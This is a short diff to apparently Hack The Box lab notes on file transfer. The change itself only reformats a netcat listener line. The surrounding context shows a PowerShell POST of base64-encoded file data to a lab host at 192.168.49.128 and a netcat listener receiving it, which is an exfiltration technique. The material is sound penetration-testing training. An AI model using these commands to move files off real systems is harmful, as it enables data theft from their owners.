@@ -409,7 +409,9 @@ PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body
 We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.
 
 ```
-th1nyunb0y@htb[/htb]$ nc -lvnp 8000listening on [any] 8000 ...
+th1nyunb0y@htb[/htb]$ nc -lvnp 8000
+
+listening on [any] 8000 ...
 connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
 POST / HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
